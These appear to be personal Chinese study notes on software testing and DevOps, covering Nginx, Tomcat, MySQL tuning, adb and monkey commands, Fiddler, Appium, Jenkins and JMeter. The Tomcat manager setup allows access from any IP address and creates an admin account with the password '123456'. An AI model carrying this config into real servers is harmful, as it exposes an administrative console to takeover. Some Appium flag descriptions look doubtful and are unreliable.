    - 优点：通过分解巨大单体应用为多个服务方法解决了复杂性问题，使得每个服务都可以有专门开发团队来开发，而且每个微服务可以独立部署，也使得每个服务可以独立扩展；缺点在于服务内容少，微服务拥有分布式应用的复杂性，以及分区的数据库及时更新多个业务主体的挑战
  - 正向代理：用户知道自己访问的地址
  - 反向代理：用户不知道自己访问的地址，`一般使用在公司内部结构中用于分发派送请求给子服务器`
  - 分库分表,分表又分为水平分表(按行数分)和垂直分表(按字段分)
  - 读写分离
- 知识扩展：[千万并发，阿里淘宝的 14 次架构演进之路！](https://blog.csdn.net/sinat_41832255/article/details/92820782)
  - 分布式系统：系统中的多个模块在不同服务器上部署
  - 高可用：系统中部分节点失效时，其他节点可以接替它继续提供服务
  - 集群：一个特定领域的软件部署在多台服务器上并作为一个整体提供一类服务，具有高可用性，如Zookeeper中的Master和Slave
  - 负载均衡：请求发送到系统时，通过某些方法把请求均分到多个节点上，使系统中每个节点能够均匀的处理请求负载
  - 本地缓存(memcached)和分布式缓存(Redis)可以讲绝大多数请求在读写服务器钱拦截，大大降低数据库压力
  - 只要实时操作的表数据量足够小，请求能够足够均匀的分发到多台服务器上的小表，那数据库就能通过水平扩展的方式来提高性能
  - 架构设计的原则
    - `N+1设计。系统中的每个组件都应做到没有单点故障；`
    - `回滚设计。确保系统可以向前兼容，在系统升级时应能有办法回滚版本；`
    - `禁用设计。应该提供控制具体功能是否可用的配置，在系统出现故障时能够快速下线功能；`
    - `监控设计。在设计阶段就要考虑监控的手段；`
    - `多活数据中心设计。若系统需要极高的高可用，应考虑在多地实施数据中心进行多活，至少在一个机房断电的情况下系统依然可用；`
    - `采用成熟的技术。刚开发的或开源的技术往往存在很多隐藏的bug，出了问题没有商业支持可能会是一个灾难；`
    - `资源隔离设计。应避免单一业务占用全部资源；`
    - `架构应能水平扩展。系统只有做到能水平扩展，才能有效避免瓶颈问题；`
    - `非核心则购买。非核心功能若需要占用大量的研发资源才能解决，则考虑购买成熟的产品；`
    - `使用商用硬件。商用硬件能有效降低硬件故障的机率；`
    - `快速迭代。系统应该快速开发小功能模块，尽快上线进行验证，早日发现问题大大降低系统交付的风险；`
    - `无状态设计。服务接口应该做成无状态的，当前接口的访问不依赖于接口上次访问的状态。`
- web服务器和应用服务器的区别(动静分离)
  - web服务器只处理静态的数据，如图片、js、css、视频
  - 应用服务器接受请求并可处理一定的业务逻辑，并返回对应的动态数据


## 垃圾回收机制

### ==python垃圾回收机制==

###### 引用计数为主  循环垃圾收集(标记清除、分代回收)为辅



- 引用计数：Python中的每个对象都会记录一个引用计数，表示有多少个引用指向该对象。当引用计数归零时，说明没有任何引用指向该对象，Python会自动回收这个对象的内存，但它无法处理循环引用的情况。
- 循环垃圾收集：定期扫描内存中的对象，并找到没有引用的对象，然后将它们释放掉
  - 标记-清除算法用于检测和清除循环引用
  - 代数回收算法根据对象的存活时间将内存分为不同的代，然后根据代的存活情况进行垃圾回收，从而提高垃圾回收的效率

### java垃圾回收机制



![img](https://cdn.tobebetterjavaer.com/tobebetterjavaer/images/jvm/tujie-gc-590c5011-48c4-4543-bd26-6f14c2b8614b.png)

- 新对象会被分配在新生代(又称为伊甸园)内存。一旦新生代内存满了，就会开始对死掉的对象，进行所谓的小型垃圾回收(Minor GC)过程。还活着的对象，此时就会老化，并最终老到进入老年代内存。
- 老年代用来保存长时间存活的对象。通常，设置一个阈值，当达到该年龄时，年轻代对象会被移动到老年代。最终老年代也会被回收。这个事件为 Major GC。
- 永久代包含JVM用于描述应用程序中类和方法的元数据。永久代是由JVM在运行时根据应用程序使用的类来填充的。此外，Java SE类库和方法也存储在这里。

## 性能优化

### 部署集群环境

```shell
# 部署Nginx
yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel # 安装依赖文件
http://nginx.org/en/download.html # 下载对应的nginx包，并上传到/usr/local/src目录解压，然后进入到解压文件中，运行一下命令，配置、编译和安装Nginx
./configure --prefix=/usr/local/nginx-1.20 --with-pcre --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-http_realip_module && make && make install 
# 创建链接文件
ln -s  /usr/local/nginx-1.20/sbin/nginx /usr/bin/nginx # /usr/bin/nginx相当于将nginx添加到path环境变量中,使在任何目录下输入nginx都可以运行
nginx -t # 检测是否安装成功,也可在在浏览器直接输入 ip地址:端口 进行访问,当端口未进行修改时不需要加端口
# nginx相关命令
启动服务：nginx
退出服务：nginx -s quit
强制关闭服务：nginx -s stop
重载服务：nginx -s reload　　(重载服务配置文件，类似于重启，但服务不会中止)
验证配置文件：nginx -t
使用配置文件：nginx -c "配置文件路径"
使用帮助：nginx -h
# 配置nginx参数(使用nginx -t可获得当前nginx的配置文件所在地,对其进行修改)
	# 配置nginx的端口以及集群服务器的负载均衡及权重信息 
	http { **
    upstream backend {
        server 192.168.1.100 weight=3; # server跟项目ip
        server 192.168.1.101; # 权重默认为1
    }

    server {
        listen 80; # 修改端口号
        server_name localhost;

        location / {   # /后面跟用于匹配访问的根目录
            proxy_pass http://backend; # 若location设置了,需要在backend后面加上location的内容
    **
        }
    }
}
```





### java监控

- `JDK是Java开发工具包,是整个Java的核心，包括了Java运行环境JRE、Java工具和Java基础类库。`
- `RE是Java的运行环境，包括JVM标准实现及Java核心类库`
- `JVM是java虚拟机，是整个java实现跨平台的最核心的部分，能够运行以Java语言写作的软件程序`

#### jvm基础及参数调整

- `Java虚拟机包括一套字节码指令集、一组寄存器、一个栈、一个垃圾回收堆和一个存储方法域。 JVM屏蔽了与具体操作系统平台相关的信息，使Java程序只需生成在Java虚拟机上运行的目标代码(字节码),就可以在多种平台上不加修改地运行。JVM在执行字节码时，实际上最终还是把字节码解释成具体平台上的机器指令执行`
  - **栈是运行时的单位，而堆是存储的单位**
    - `面向对象就是堆和栈的完美结合，当把对象拆开会发现对象的属性其实就是数据，存放在堆中；而对象的行为(方法)，就是运行逻辑，放在栈中。`
- 调整步骤
  - 在jdk的bin目录下，找到jvisualvm.exe运行
  - 启动相应的java程序，可对程序进行资源监控
    - `更详细的监控数据可以用Visual Gc插件实现`

### tomcat监控

#### 监控页面

```python
# 在 tomcathome/conf/Catalina/localhost/下创建 manager.xml，填入如下内容
<Context privileged="true" antiResourceLocking="false" 
         docBase="${catalina.home}/webapps/manager">
    <Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="^.*$" />
</Context>
# 编辑./conf目录的tomcat-users.xml文件，写入以下内容
<role rolename="manager"/>
    <role rolename="manager-status"/>
  <role rolename="manager-gui"/>
  <user username="admin" password="123456" roles="manager,manager-status,manager-gui"/>
# 打开tomcat的浏览器初始界面，进入 Server Status
```

#### 参数调整

```python
# 编辑bin目录的catalina.bat文件，输入
set JAVA_OPTS=-Xms1024M -Xmx1024M # 值一致是为了避免性能忽上忽下
# tomcat常用配置和优化方法 https://www.cnblogs.com/xuwc/p/8523681.html
# 编辑conf目录的server.xml文件，编辑connector port='8080'部分的内容
	# acceptCount="1000"  可接受的最大连接数；
    # maxProcessors="1000"  最大活动线程数；
    # connectionTimeout="20000"  超时时间，单位是ms；
    # maxThreads:Tomcat可创建的最大的线程数，每一个线程处理一个请求；
    # URIEncoding="gbk"   设置tomcat默认的转码格式
```





### mysql调优

```mysql
# 查询MySQL数据库的系统变量
show variables like '%query%'
# 修改系统变量
my.ini(windows)/my.cof(Linux),在MySQLD区段修改或增加相应的配置,保存后重启生效
cmd修改立即生效,但重启后自动失效
# mysql索引
    # 优点:所有的 MySql 列类型(字段类型)都可以被索引，也就是可以给任意字段设置索引;大大加快数据的查询速度
    # 缺点:创建索引和维护索引要耗费时间，并且随着数据量的增加所耗费的时间也会增加;索引也需要占空间，索引文件可能会比数据文件更快达到mysql数据上线值;当对表中的数据进行增加、删除、修改时，索引也需要动态的维护，降低了数据的维护速度

# sql优化建议
"""
避免大sql 一个SQL只能在一个cpu上运行，在高并发环境中，大SQL容易影响性能问题，可能一个大SQL会把数据库搞死，因此应该拆分SQL
无关操作踢出事务，减少资源占用；保持一致性的前提下，拆分事务
避免大批量更新，避开高峰
避免类型转换
避免取过量数据，建议使用limit
避免在SQL 语句中进行数学运算、函数计算、逻辑判断等操作
避免 SELECT *
避免在 where 子句中使用!=或<>操作符
避免在 where 子句中对字段进行 null 值判断
尽量避免全表扫描
避免使用or，同一字段推荐in，不同字段，推荐union
like 语句避免前置百分号
优先优化高并发的 SQL
"""
```

### web前端优化

- [前端性能优化方案](https://www.jianshu.com/p/b0fd5d87e295)
- 减少请求数量
- DNS解析缓存
- 建立TCP(长连接)连接
- 减少服务器响应时间
  - `基本上来说，请求和响应的第一个字节传输所花的时间都会很少,可近似认为TTFB就是服务器端的处理时间`
- 提高带宽,提高响应内容的上传速率

# app测试

## app简介

### android

- 基于Linux内核开发并开源的操作系统
- API应用程序编程接口,是API Level编程接口：每个android版本上都会给开发者开放应用程序编程接口(api),每个版本的api会用版本号进行命名，称为api level
- 基本架构
  - Linux内核
  - 系统运行库
  - 应用框架层
  - 应用层
- 四大组件
  - 活动Activity：负责与用户交互，是用户操作的可视化界面，为用户提供一个完成操作指令的窗口
    - 一个activity对应一个界面，一个界面可以对应多个activity
  - 服务Service:用作后台处理长时间任务逻辑的组件，无ui界面
  - 广播接收器(Broadcast Receiver):在应用程序之间传输信息的机制。对发送出来的广播进行过滤接受并响应。
  - 内容提供程序(Content Provider)：可以使不同进程和app间数据进行交互和共享，即跨进程通信

- 测试流程：需求评审——测试计划——测试用例设计——<font size="3" color="red">用例评审</font>——接收第一个版本测试——提交bug——开发修复bug——第二个版本(更多的版本)—bug全部修复———生产环境(正式)的包——测试通过后通知产品验收——-通知市场人员发布到应用商店———从应用市场下载，然后安装执行回归验证。
  - 开发时间：测试时间 大概是 2：1
  - Android：xxx.apk 可以发布到市场，也可以直接给链接让用户下载，ios：必须发布到苹果商店
    - ios的测试包安装：在开发者工具(付费)里配置测试设备的设备id，打包的时候把设备id加进去，跳过了验证。只能免费配置100个设备id
    - app审核时间：andriod：审核时间大概2-3小时,IOS：审核时间大概1周
  - 测试任务开始前，检查各项测试资源:产品功能需求文档；《需求规格说明书》;产品原型图；产品效果图；行为统计分析定义文档；测试设备(ios手机，Android手机)；其他。
- app分类：<font size="3" color="red">用java(andrioid)、object-c(ios)、swift(ios)开发的app叫做原生app</font>,此外还有就是web app(h5技术等)和hybird app(混合语言)

## 测试准备

- 下载安装夜神模拟器

- 解压sdk文件,并使用SDK Manager进行安装,然后把platform-tools和build-tools\29.0.3文件夹配置到环境变量中
- 将platform-tools的adb.exe替换为夜神模拟器中的adb.exe
- 输入adb version 出现版本号,安装成功

## adb命令

- **adb devices**:显示当前运行的全部Android设备序列号和模拟器ip端口

  - 若未显示设备，手机应进入开发者模式启用调式

  - `若提示adb server version (36) doesn't match this client (41)，到夜神模拟器安装目录依次使用 nox_adb version 和 adb version 验证其版本是否为41，非41的将41的版本复制重命名替换即可`

- **adb kill-server** ：关闭adb服务

- **adb start-server**：启动adb 服务

- adb shell：进入模拟器的shell模式，可直接运行Linux命令。
  - adb [-s 序列号或模拟器ip端口] shell：指定设备连接
  - **adb -s** 序列号或模拟器ip端口 命令：对某一设备执行命令

- adb **install** [-r] apk文件路径：安装应用程序,-r表示replace覆盖安装

- adb **uninstall** 主包名：卸载app

- **aapt dump badging apk文件路径**:查看apk的相关信息

  - package：主包名
  - uses-permission:app需要的各种权限
  - Application Label：app的可读名称
  - Launchable Activity：主类名，启动 Activity 
  - Features：app使用的硬件和软件功能
  - Screens：app支持的屏幕尺寸类别
  - Densities：支持的图像密度
  - native-code：app本地代码库

- | 管道符

- findstr 字符：查找包含特定字符的文本行

- adb pull 手机文件路径 电脑路径：将文件拉取到电脑上

- adb push 电脑文件路径 手机路径：将文件拉取到手机上

- adb shell am force-stop -n 主包名：停止应用程序

- **adb shell am start -W -n 主包名/主类名**：启动应用程序并查看启动时间

  - 热启动：app处于后台
  - 冷启动：app未处于后台
  - ThisTime ：最后一个启动的Activity的启动最后耗时时间
  - TotalTime：自己的所有Activity的启动耗时。其实就是app启动的时间
  - WaitTime ：ActivityManangerService 启动 APP 的Activity 时的总时间(包括当前Activity的onPause() 和自己Activity的启动 )

- adb logcat -s ActivityManager:启动后再手工启动App，可即时查看Activity 名称.

- adb shell ps | findstr 主包名：查看某个进程是否在启动状态

- adb connect 设备编号：让adb再次连接到某台设备上。

- adb shell screencap -p 路径/文件名：对设备进行截图并保存到指定路径下。

- adb shell pm list package [-3]: 列出所有[第三方安装]的app包名。

- adb shell getprop ro.build.version.release:获取系统版本号

- adb shell uiautomator dump [-p 路径文件名]：当前屏幕的所有可见 UI 元素的信息

- adb shell input 命令:模拟用户输入的 ADB 命令

  -  text:在焦点位置输入文本，中文暂不支持

  - keyevent： 发送一个键盘事件

    - | 按键编码 | KeyEvent类的按键名称 | 说明                    |
      | -------- | -------------------- | ----------------------- |
      | 3        | KEYCODE_HOME         | 主页键(未开放给普通App) |
      | 4        | KEYCODE_BACK         | 返回键(后退键)          |
      | 24       | KEYCODE_VOLUME_UP    | 加大音量键              |
      | 25       | KEYCODE_VOLUME_DOWN  | 减小音量键              |
      | 26       | KEYCODE_POWER        | 电源键(未开放给普通App) |
      | 66       | KEYCODE_ENTER        | 回车键                  |
      | 67       | KEYCODE_DEL          | 删除键 (退格键)         |
      | 82       | KEYCODE_MENU         | 菜单键                  |
      | 84       | KEYCODE_SEARCH       | 搜索键                  |
      | 187      | KEYCODE_APP_SWITCH   | 任务键(未开放给普通App) |

  - tap X Y：在设备的(X，Y)坐标位置发送一个触摸事件(即单击)

  - swipe X1 Y1 X2 Y2 ：模拟滑动操作，从(X1,Y1)位置滑动到(X2，Y2)位置

    - swipe X1 Y1 X1+1 Y1+1 2000：模拟在同一个位置实现2秒钟的长按。

- **adb logcat** 查看实时日志

  - `Logcat` 是一个命令行工具，用于转储系统消息日志，包括从应用使用 `Log` 类写入的消息。

- ==adb logcat *:优先级符号== ：查看指定优先级的日志

  - 优先级是以下字符值之一(按照从最低到最高优先级的顺序排列)：
    - `V`：详细(最低优先级)
    - `D`：调试
    - `I`：信息
    - `W`：警告
    - `E`：错误
    - `F`：严重错误
    - `S`：静默(最高优先级，绝不会输出任何内容)

- **adb shell dumpsys**:查看app消耗的资源

  - couinfo：cpu资源
  - meminfo：内存资源
  - battery：电量

- `adb shell monkey`: 启动 Monkey 测试,会随机生成用户事件(如点击、滑动、按键等)，以模拟用户在应用程序上执行的操作。

  - adb shell monkey [-p com.wondertek.paper] [-v -v -v ]\[-s 1663779041148] [--throttle 300] 3000
    - -p :指定测试app的包名
    - -v : 日志级别选项，多个v可以增加详细程度，三个v表示非常详细
    - -s ：`随机数种子，用于确定 Monkey 测试的随机事件序列。如果使用相同的种子，测试将生成相同的事件序列，这对于复现问题非常有用，由64个比特位组成，共有(正负)2*2**64个情况，`
    - --throttle 300:每个事件后延迟300毫秒
    - 3000: 这是 Monkey 测试的事件数量

- adb shell pm revoke 包名 android.permission.INTERNET：取消软件的联网权限

  - 十一个用户事件和对应的日志事件
    - **触摸事件：touch**：由一组 Touch(ACTION_DOWN) 和 Touch(ACTION_UP) 事件组成。
    - **滑动事件：motion**：由一个Touch(ACTION_DOWN )事件、一系列的Touch(ACTON_MOVE)事件和一个Touch(ACTION_UP)事件组成的
    - **二指缩放事件：pinchzoom**：起始事件是一个Touch(**ACTION_DOWN**)事件和一个**ACTION_POINTER_DOWN**事件，即模拟两个手指同时点下；中间是一系列的**ACTION_MOVE**事件，即两个手指同时在屏幕上直线滑动；结束是由一个**ACTION_POINTER_UP**事件和一个**ACTION_UP**事件组成的，即两个手指同时放开
    - **轨迹事件：trackball**：由一系列的Trackball(ACTION_MOVE) 事件组成的
    - **屏幕旋转事件：rotation**：`由一个rotation 事件组成，其中degree 表示的是旋转方向，顺时针旋转，0 表示旋转90度的方向；1 表示旋转180度的方向，2表示旋转270度的方向，3 表示旋转360度的方向。在执行过程中，可以看到手机屏幕在横竖屏之间不断的切换。persist=是否持续旋转`
    - **基本导航事件：nav(现在已经很少)**：`由一个Key(ACTION_DOWN)和一个Key(ACTION_UP)组成的，点击的就是上，下，左，右四个方向按键)`
    - **主要导航事件：majornav**：`由一个Key(ACTION_DOWN)和一个Key(ACTION_UP)组成的，点击的键，就是home键，回退键`
    - **系统按键事件：syskeys**：`由一个Key(ACTION_DOWN)和一个Key(ACTION_UP)组成的，点击的就是上面提到的几个系统按键。`
    - **启动Activity事件：appswitch**：`由一个switch操作组成的`
    - **键盘事件：flip** **10**:`Sending Flip keyboardOpen=true/false;主要是对键盘的打开和关闭操作`。
    - **其他类型事件：anyevent**：`由一个Key(ACTION_DOWN) 和一个Key(ACTION_UP)组成的，点击按键就是一些系统按键，比如字母，数字。(因为现在手机很少带字母或者数字按键，所以这个事件一般使用的比较少。)`

  - **monkey日志错误**
    - CRASH：应用崩溃。闪退
    - ANR：application not response 应用没有响应。app死掉
    - ERROR：app在使用过程中出现错误
    - EXCEPTION：app在使用过程中出现异常

### app测试点

#### 安装测试

- 权限
  - 权限不给，能不能装上，装上以后能不能用
  - 安装完后的页面如何有提示，安装包是否删除
  - 启动后是否提示需要授权那些权限，同意或取消的预期结果是否正确

- 安装位置
  - 安装到存储卡或者手机上，是否能正常启动

#### 卸载测试

- 是否询问是否保留用户数据
  保留：用户存储在手机上，app再次安装，遗留的数据还能继续用
  不保留：所有的数据全都清空

#### 升级/更新

- 能否正常更新,更新后的版本号对不对，更新完后能否正常使用
- 更新方式：普通更新、强制更新、热修复(用户无感知，后台借用第三方接口自动更新，收费)
- 更新过程：相对路径还是绝对路径

#### 功能测试

- 开屏广告(启动画面)
  - 广告点击跳转的页面是否正确。跳转后的页面称为落地页(landing page)
  - 倒计时的时间以及计时结束后自动跳转
  - 广告点击的统计
- 启动方式
  - 热启动后，app是否能正常操作
  - 启动时间。通过adb命令获取
- 标记
  - 后台的设置。后台设置不同的标记，前台是否显示
- push：消息推送后台
  - 推送规则
  - 用户设置：
    - 不接受推送消息或者关闭通知
    - 用户设置免打扰时间段
    - 接受的消息能否查看，能否点击唤醒app并且跳转到落地页
- 交叉事件/中断/打断
  - 常见的交叉事件：电话，短信，闹钟，日历提醒事件，省电模型的提醒，网络信号的提醒，主动切换(查看推送消息)，充电，切换到后台，音量，截图，锁屏。微信电话，qq电话
  - 高优先级的事件结束后，能否回到app刚才的页面，app能否正常操作
- 需求文档的一些功能

#### 兼容性测试

- 自身兼容：操作系统(至少兼容4个版本)、厂商：华为，oppo，vivo，小米等主流产商、型号、分辨率、屏幕尺寸
- 系统兼容性：新手机是否能兼容市面上流行的app，去应用市场下载排名前100或者300的应用逐个安装到新手机上，看app是否能正常启动并运行


### fiddler监控app

- 修改将手机或模拟器的网络设置为fiddler同一个局域网中，手机无线网设置代理，代理的ip为fiddler的电脑ip，端口为fiddler的端口

- 访问http：//fiddler的ip：fiddler的端口，下载fiddler的ca文件，然后安装，模拟器可省略该步骤

#### fiddler~弱网测试

- 修改customize rules的m_SimulateModem的参数

  <img src="测试开发.assets/image-20230912200334941.png" alt="image-20230912200334941" style="zoom:50%;" />

    ```python
    if (m_SimulateModem) {
              // Delay sends by 300ms per KB uploaded. # 每上传1kb延迟300毫秒
              oSession["request-trickle-delay"] = "300"; 
              // Delay receives by 150ms per KB downloaded. # 每下载1kb延迟150毫秒
              oSession["response-trickle-delay"] = "150"; 
          }
    ```

- 启用设置

  <img src="测试开发.assets/image-20230912200928087.png" alt="image-20230912200928087" style="zoom: 50%;" />

- 计算公式为：[1/(上或下行速率/8)] x 1000

  注意：1KB=8kb

  #### fiddler~自动响应

  - 在fiddler的自动回复器可按照特定的规则指定响应的内容

  

### app自动化

#### appium

##### 界面版

- 到官网下载appium并安装

  <img src="测试开发.assets/image-20230918200116308.png" alt="image-20230918200116308" style="zoom:50%;" />

- Appium Inspector<font size="2" >(实时查看元素，并且提供录制操作功能，还可以转为python代码)（能力详看测试脚本字典参数）</font><img src="测试开发.assets/image-20230918202633427.png" alt="image-20230918202633427" style="zoom:50%;" />

##### 无界面版

- <font size="2">[Node.js官网](https://nodejs.org/en/)下载最新版本的Node.js并安装。运行命令`node -v`和`npm -v`，确认安装是否成功</font>

- <font size="2">npm install -g appium --registry https://registry.npm.taobao.org # 安装appium </font>

- <font size="2">npm --registry http://registry.cnpmjs.org install -g appium-doctor # 安装Appium Doctor检查程序</font>

- <font size="2" >通过命令`appium -v`和`appium-doctor`来确认安装是否成功，`doctor的necessary部分除apkanalyzer.bat部分全部通过`</font>

- <font size="2">启动appium后若无driver，可使用npm install appium-uiautomator2-driver --force 强制安装uiautomator2，若一直无法安装成功，可使用npm cache clean --force强制删除缓存</font>

- <font size="4" color="red">appium的启动命令和参数</font>

  `appium server -a 127.0.0.1 -p 4725 -ca -cp  —session-override -g —log-timestamp  —log-level —local-timezone`

  - `-a 127.0.0.1`：<font size="2">指定 Appium 服务器的监听地址为 127.0.0.1，即本地主机。</font>

  - `-p 4725`：<font size="2">指定 Appium 服务器的监听端口为 4725</font>

  - `-ca`：<font size="2">表示在每次会话之前都要清除应用程序数据，即在每次测试会话开始前都会执行应用程序的卸载和重新安装。</font>

  - `-cp`：<font size="2">表示在每次会话之前都要清除应用程序的数据目录，以确保应用程序在测试会话开始时处于初始状态。</font>

  - `—session-override`：<font size="2">表示如果 Appium 服务器上已经存在会话，就覆盖它，允许多个测试会话在同一服务器上运行。</font>

  - `-g`：<font size="2">表示生成测试报告，通常在指定路径下保存测试结果。</font>

  - `—log-timestamp`：<font size="2">表示在日志中包含时间戳，以便跟踪日志中事件的时间。</font>

  - `—log-level`：<font size="2">指定日志级别，可以设置为不同的值，如 "info"、"warn"、"error" 等，以控制日志输出的详细程度。</font>

  - `—local-timezone`：<font size="2">表示使用本地时区来记录日志和时间戳。</font>

- 测试脚本字典参数

  1. `automationName`：<font size="2">指定自动化测试引擎，可以是 Appium 或 Selendroid。对于较新的 Android 版本（如6.0以上），需要明确指定为 `'uiautomator2'`</font>。

  2. `platformName`：<font size="2">指定要测试的手机操作系统，可以是 iOS、Android 或 FirefoxOS。</font>

  3. `platformVersion`：<font size="2">指定移动操作系统的版本</font>
     1. <font size="2">可以使用`adb shell getprop ro.build.version.release `获取手机版本</font>

  4. `app`：<font size="2">指定待测试的应用程序的路径或包名。可以是应用的本地路径或远程 URL，`可选`</font>。

  5. `browserName`：<font size="2">如果你要测试手机上的浏览器应用，需要指定浏览器的名称，例如 `'Safari'`（iOS）或 `'Chrome'`（Android）</font>

  6. `newCommandTimeout`：<font size="2">设置命令超时时间，以秒为单位。如果在超时时间内未接收到新命令，Appium 将假定客户端退出，并自动结束会话</font>。

  7. `autoLaunch`：<font size="2">指定 Appium 是否需要自动安装和启动应用程序，默认值为 `true`</font>

  8. `udid`：<font size="2">连接的移动设备的唯一标识符</font>

  9. `autoWebview`：<font size="2">设置为 `true` 可以直接切换到 WebView 上下文，默认值为 `false`</font>

  10. `noReset`：<font size="2">设置为 `true` 时，在会话前不会重置应用状态，默认值为 `false`</font>

  11. `fullReset`：<font size="2">设置为 `true` 时，在会话结束后会自动清除被测应用的数据和状态，默认值为 `false`</font>

  12. `appActivity`：<font size="2">指定启动 Android 应用程序的主 Activity 类名，通常需要在前面加上点号（`.`）</font>

  13. `appPackage`：<font size="2">指定要运行的 Android 应用程序的主包名</font>

  14. `deviceReadyTimeout`：<font size="2">设置等待模拟器或真机准备就绪的超时时间</font>

  15. `unicodeKeyboard`：<font size="2">设置为 `true` 以使用 Unicode 输入法，以支持中文输入</font>

  16. `resetKeyboard`：<font size="2">在使用 `unicodeKeyboard` 参数后，可以设置为 `true` 以在测试会话结束时重置键盘为默认设置</font>

  

```python
pip install Appium-Python-Client # 安装appium包
from appium import webdriver 
from appium.options.android import UiAutomator2Options # 3.0版本需要该模块来转配置文件
from appium.webdriver.common.appiumby import AppiumBy # 元素定位的所需的参数
from appium.webdriver.common.touch_action import TouchAction # 操作类似于selenium的ActionChains模块,都需要perform()进行释放操作
pg_file = {测试脚本字典参数}
options = UiAutomator2Options().load_capabilities(pg_file) # appium的3.0版本需要转化
driver = webdriver.Remote('http://appium_host:appium_port', options=options)
driver.keyevent(KEYCODE_MENU)
driver.press_keycode(self, keycode, metastate=None)：标准按键时间，模拟单击操作。
driver.long_press_keycode(self, keycode,metastate=None)：较长时间按键，模拟长按操作，比如长按Home键返回主页等
```

###### 备注

- appium的driver继承于selenium，之间的使用是互通的，具体的appium的dirver定位方式可以参考源代码，常用的仍然是xpath、id等

- | KEYCODE_CALL        | 拨号键       | 5    |
  | ------------------- | ------------ | ---- |
  | KEYCODE_ENDCALL     | 挂机键       | 6    |
  | KEYCODE_HOME        | HOME键       | 3    |
  | KEYCODE_APP_SWITCH  | 任务键       | 187  |
  | KEYCODE_BACK        | 返回键       | 4    |
  | KEYCODE_SEARCH      | 搜索键       | 84   |
  | KEYCODE_CAMERA      | 拍照键       | 27   |
  | KEYCODE_POWER       | 电源键       | 26   |
  | KEYCODE_MUTE        | 话筒静音键   | 91   |
  | KEYCODE_VOLUME_MUTE | 扬声器静音键 | 164  |
  | KEYCODE_VOLUME_UP   | 音量增加键   | 24   |
  | KEYCODE_VOLUME_DOWN | 音量减小键   | 25   |
  | KEYCODE_ENTER       | 回车键       | 66   |

## 持续集成

### 概念

### 安装和使用Jenkins

```shell
1.将jenkins的war包放进tomcat/webapps目录
2.访问网页
3.自定义选择的插件,安装：Folders，Timestamper，Workspace Cleanup，Nodejs，Subversion（如果git管理则安装git），Localzation：Chinese。
4.自定义ant插件: `manage jenkins →tools→ant`
	# 设置ant的名字和路径
	# 自定义ant的jdk版本,如
	export JAVA_HOME=/usr/local/jdk1.8.0_251
	export JRE_HOME=$JAVA_HOME/jre
5.新建item，ant项目
	源码管理填写url和credentials
	构建环境勾选Delete workspace before build starts（在构建开始之前删除工作区）（可选）
	构建步骤lnvoke Ant，选择ant（若指定了要生成测试报告，则需要再最前面执行一次ant，不然不会有war包生成）
	添加构建后的命令Execute shell（可选）
        """
        BUILD_ID=DONTKILLME # 环境变量设置，通常用于告诉 Jenkins 或其他自动化工具不要在构建过程中杀死这个任务。这可以确保任务在后台正常运行
        /opt/tomcat2/bin/shutdown.sh
        sleep 3
        rm -rf /opt/tomcat2/webapps/woniusales*
        cp -r /root/.jenkins/workspace/woniu/woniusales.war /opt/tomcat2/webapps/
        sleep 3
        /opt/tomcat2/bin/startup.sh
        sleep 3
        /opt/tomcat2/bin/shutdown.sh
        sleep 1
        cp /opt/tomcat2/webapps/db.properties /opt/tomcat2/webapps/woniusales/WEB-INF/classes/
        sleep 3
        /opt/tomcat2/bin/startup.sh
        """
5、指定windows电脑运行python代码
    `manage jenkins →Nodes and Clouds → New Node` 指定远程工作目录，即存放python脚本的Jenkins目录
    点击新创建的节点，复制windows部分的代码，在设置的jenkins目录运行cmd命令，保持cmd窗口不要关
        `因为jenkins的代码需要11版本的jdk，若电脑配置的jdk版本不对，可用jdk的bin路径跟第二个Jenkins代码`
	新建item，`设置general的限制运行节点，选择创建的节点`，源码管理同ant部分，构建步骤中添加`exeute windows batch command，设置set PYTHONPATH=${WORKSPACE]；cd ecshop（ecshop为python项目拉取后的文件）；python run.py`要执行的py文件
	`
	同样也可以指定报告的生成路径
```

#### jmeter的build报告

```shell
<?xml version="1.0" encoding="UTF-8"?>
<project name="ant-jmeter-test" default="run" basedir=".">
    <!-- 需要改成自己本地的 Jmeter 目录-->  
    <property name="jmeter.home" value="/opt/jmeter" />
    <property name="titleReport" value="接口测试"/>
    <!-- jmeter生成jtl格式的结果报告的路径--> 
    <property name="jmeter.result.jtl.dir" value="/opt/jmeter/jtl" />
    <!-- jmeter生成html格式的结果报告的路径-->
    <property name="jmeter.result.html.dir" value="/opt/jmeter/html" />
    <!-- 生成的报告的前缀-->  
    <property name="ReportName" value="TestReport" />
    <property name="jmeter.result.jtlName" value="${jmeter.result.jtl.dir}/${ReportName}.jtl" />
    <property name="jmeter.result.htmlName" value="${jmeter.result.html.dir}/${ReportName}.html" />

    <target name="run">
        <antcall target="test" />
        <antcall target="report" />
    </target>
    
    <target name="test">
        <taskdef name="jmeter" classname="org.programmerplanet.ant.taskdefs.jmeter.JMeterTask" />
        <jmeter jmeterhome="${jmeter.home}" resultlog="${jmeter.result.jtlName}" >
            <!-- 声明要运行的脚本"*.jmx"指包含此目录下的所有jmeter脚本-->
            <testplans dir="${jmeter.home}/jmx" includes="*.jmx" />

            <property name="jmeter.save.saveservice.output_format" value="xml"/>
        </jmeter>
    </target>
        
    <path id="xslt.classpath">
        <fileset dir="${jmeter.home}/lib" includes="xalan*.jar"/>
        <fileset dir="${jmeter.home}/lib" includes="serializer*.jar"/>
    </path>

    <target name="report">
        <tstamp> <format property="report.datestamp" pattern="yyyy/MM/dd HH:mm" /></tstamp>
        <xslt 
            classpathref="xslt.classpath"
            force="true"
            in="${jmeter.result.jtlName}"
            out="${jmeter.result.htmlName}"
            style="${jmeter.home}/extras/jmeter-results-detail-report_21.xsl">
            <param name="dateReport" expression="${report.datestamp}"/>
        </xslt>

        <!-- 因为上面生成报告的时候，不会将相关的图片也一起拷贝至目标目录，所以，需要手动拷贝 --> 
        <copy todir="${jmeter.result.html.dir}">
            <fileset dir="${jmeter.home}/extras">
                <include name="collapse.png" />
                <include name="expand.png" />
            </fileset>
        </copy>
    </target>
</project>

# 若报错ant.taskdefs.jmeter.JMeterTask找不到，则将jmeter的文件中的/extras/ant-jmeter-1.1.1.jar复制到ant/lib中
```



![image-20231008173256040](C:\Users\lyj\AppData\Roaming\Typora\typora-user-images\image-20231008173256040.png)



# go

go语言的文件扩展名为.go，运行方式为`go run 文件名`，或构建二进制文件`go bulid 文件名`后直接运行生成后的二进制文件

